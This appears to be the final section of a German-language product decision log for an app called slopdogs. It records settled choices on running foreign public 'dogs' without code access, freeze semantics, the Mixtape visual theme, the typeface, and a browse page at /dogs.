| 8.15 | **ENTSCHIEDEN (10-0): ja** — fremde Dogs duerfen im eigenen Kennel laufen, wenn sie oeffentlich ausfuehrbar sind, auch ohne Code-Leserecht ("fremde dogs wenn die public sind aber keine code leserechte haben"). Umsetzung nach Nira B+C: Output ja, Code nie, Version-Pin, keine Keys und kein Owner-jsonStore fuer den Fremd-Dog. | — | — | — |
| 8.16 | **ENTSCHIEDEN (10-0): nicht einfrieren** — Community-Kennels entwickeln sich weiter ("ne die sollen sich weiterentwickeln ausser der user friert die ein"). Folge: neues Feld frozen (Boolean) an Kennel/Dog; gesetzt/geloest vom Owner, bei Community-Eintraegen (ownerId null) vom Superuser; frozen => EDIT fuer alle ausser Owner gesperrt, RUN/READ unveraendert. Eingereiht in P3.5 (Schema + Gate in canMutate + MCP/REST freeze/unfreeze + UI-Schalter in P6). | — | — | — |
| 8.17 | **ENTSCHIEDEN (10-0): oeffentlich = ausfuehrbar und sichtbar** ("wenn die public sind können die ausgeführt werden") — oeffentliche run-only-Eintraege erscheinen in Listen und auf der Landing und sind fuer jeden ausfuehrbar. | — | — | — |
| 8.18 | **ENTSCHIEDEN (10-0): Void-Kino bleibt, Easter-Egg bleibt** ("ich mag das eigentlich und easteregg kann drinne bleiben"). P6 uebernimmt error-video-popup, video-popup, youtube-embed und das Iris-Egg in die neue Optik; Boreals Streich-Empfehlung ist verworfen. | — | — | — |
| 8.19 | **ENTSCHIEDEN (10-0): Default-Landing-Look = c Mixtape.** Lead-Default im Kennel slopdogs-landing auf c umgestellt. | — | — | — |
| 8.20 | **ENTSCHIEDEN (10-0): App-Look = Mixtape** ("ne mixtape"), nicht Follies dunkler Look B. P6-DESIGN.md wird auf die Mixtape-Welt umgestellt (Kassetten-Inlay, Creme, Tinte, Tape-Orange, Inlay-Teal; Werkzeug-dicht, nicht Poster) — Revision durch Follie folgt. | — | — | — |
| 8.21 | **ENTSCHIEDEN (10-0): keine Detailseite je Dog** ("es gibt eine neue eigene seite für die auflistung und das browsen. einzelne dogs haben keinen wert außer als vorschau."). Statt /dogs/:id: eine eigene Seite /dogs zum Auflisten und Browsen (Suche, Sortierung proven/calls30d/reuse, Filter), ein Dog erscheint nur als Vorschau (Panel/Sheet) — Revision durch Follie folgt. | — | — | — |
| 8.22 | Canvas-Grund der Kennel-Seite (Follie Rev. 2, 1.2/7.1) | (A) "ruled inlay": Creme-Canvas mit 24-px-Punktraster, Wellen als Creme/Creme2-Baender, Karten Creme2 mit 2 px Ink; (B) "tape shell": dunkelbraun `#2a241c` mit Creme-Punkten, Karten Creme2 auf dunkel | **(A)** | Ein Papier, eine Welt; Monaco im Theme "inlay" sitzt nahtlos daneben; keine zweite Neutral-Skala; keine Augen-Readaption beim Oeffnen des Inspectors; die Ink-gefuellten Fremd-Dog-Karten bedeuten nur auf Creme etwas. Kosten: ein Raster-Gradient, zwei Bandfarben. |
| 8.23 | Textschnitt der App (Follie 7.2) | (a) Courier Prime als einziger Textschnitt (Body, Data, Labels, Code); (b) Courier Prime fuer Data, eine Sans fuer Body | **(a)** | Es ist der Label-Maker und das Inlay; eine Sans waere eine zweite Stimme, die die Landing nie hatte. Rueckfall, falls 14 px Courier in der ersten Woche ermuedet: 15 px, kein neuer Schnitt. Kosten: zwei woff2 (400/700) statt vier. |
| 8.24 | `[USE IN KENNEL]` in der Browser-Vorschau (Follie 7.5) | v1 / spaeter | **v1** | Sonst ist der Browser ein Katalog ohne Regal; die Palette hat den Add-Pfad schon, der Picker waehlt nur den Kennel; das Pinning von run-only-Dogs (8.15) passiert hier. Kosten: `sd-kennel-picker` ≤ 2 kB, ein Aufruf `PUT /api/kennels/:id` mit `dogIds` + Version-Pin. |
| 8.25 | Freeze-Semantik (Follie 7.10) | (a) Freeze sperrt jede Mutation inkl. Owner bis Unfreeze; Laeufe, Sterne, Kopien laufen weiter; (b) Freeze sperrt auch Kopien | **(a)** | Eine eingefrorene Kassette spielt weiter und laesst sich ueberspielen; Kopierschutz ist ein eigenes Recht (`run-only`, W16) und wird nicht mit Freeze vermischt. Community-Eintraege: nur Superuser friert (8.16). Kosten: `canMutate`-Gate in P3.5, kein weiterer Pfad. |
| 8.26 | Browser-Default-Sortierung `/dogs` (Follie 7.14) | proven / calls 30d | **proven** | Spiegelt `list_nodes` fuer Agenten ("prefer proven dogs", P4b); Menschen und KIs sehen dieselbe Reihenfolge. Ohne `stats` (alter Server) faellt der Browser auf `name`. |
| 8.27 | Dark "tape shell"-Theme fuer die App (Follie 7.3) | v1 / v2 / nie | **v2** | Token-Block steht in 6.2 (`[data-theme="dark"]`); Monaco und Canvas brauchen einen eigenen Durchgang. Nur, wenn jemand nachts arbeitet und fragt. |

---

Ende des Plans. Aenderungen an diesem Dokument: nur mit Vermerk in 1.2.

